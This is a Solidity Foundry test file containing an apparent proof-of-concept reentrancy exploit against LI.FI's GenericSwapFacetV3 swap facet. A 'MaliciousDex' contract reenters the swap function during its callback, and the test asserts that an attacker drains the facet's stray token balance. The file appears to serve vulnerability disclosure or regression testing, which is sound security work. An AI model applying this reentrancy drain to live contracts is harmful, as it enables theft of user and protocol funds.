// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import {Test} from "forge-std/Test.sol";
import {GenericSwapFacetV3} from "lifi/Facets/GenericSwapFacetV3.sol";
import {LibSwap} from "lifi/Libraries/LibSwap.sol";
import {LibAllowList} from "lifi/Libraries/LibAllowList.sol";
import {TestToken} from "../utils/TestToken.sol";

contract MaliciousDex {
    GenericSwapFacetV3Harness public facet;
    TestToken public token;
    address public attacker;

    constructor(GenericSwapFacetV3Harness _facet, TestToken _token, address _attacker) {
        facet = _facet;
        token = _token;
        attacker = _attacker;
    }

    function reenter() external {
        LibSwap.SwapData memory swap = LibSwap.SwapData({
            callTo: address(this),
            approveTo: address(this),
            sendingAssetId: address(token),
            receivingAssetId: address(token),
            fromAmount: 0,
            callData: abi.encodeWithSelector(MaliciousDex.noop.selector),
            requiresDeposit: false
        });
        facet.swapTokensSingleV3ERC20ToERC20(bytes32(0), "", "", payable(attacker), 0, swap);
    }

    function noop() external {}
}

contract GenericSwapFacetV3Harness is GenericSwapFacetV3 {
    constructor(address _nativeAddress) GenericSwapFacetV3(_nativeAddress) {}

    function addAllowedContract(address _contract) external {
        LibAllowList.addAllowedContract(_contract);
    }

    function addAllowedSelector(bytes4 _selector) external {
        LibAllowList.addAllowedSelector(_selector);
    }
}

contract GenericSwapFacetV3ReentrancyTest is Test {
    GenericSwapFacetV3Harness facet;
    MaliciousDex dex;
    TestToken token;

    function setUp() public {
        facet = new GenericSwapFacetV3Harness(address(0));
        token = new TestToken("Token", "TKN", 18);

        dex = new MaliciousDex(facet, token, address(this));

        facet.addAllowedContract(address(dex));
        facet.addAllowedSelector(MaliciousDex.reenter.selector);
        facet.addAllowedSelector(MaliciousDex.noop.selector);

        // Pre-fund facet with stray tokens
        token.mint(address(facet), 5 ether);

        // Give attacker some tokens to initiate swap
        token.mint(address(this), 1 ether);
        token.approve(address(facet), type(uint256).max);
    }

    function test_ReentrancyDrainsTokenBalance() public {
        LibSwap.SwapData memory swap = LibSwap.SwapData({
            callTo: address(dex),
            approveTo: address(dex),
            sendingAssetId: address(token),
            receivingAssetId: address(token),
            fromAmount: 1 ether,
            callData: abi.encodeWithSelector(MaliciousDex.reenter.selector),
            requiresDeposit: false
        });

        facet.swapTokensSingleV3ERC20ToERC20(bytes32(0), "", "", payable(address(this)), 0, swap);

        // Attacker receives deposit + stray tokens
        assertEq(token.balanceOf(address(this)), 6 ether, "attacker drained tokens");
        // Facet balance should be zero
        assertEq(token.balanceOf(address(facet)), 0, "facet drained");
    }
}

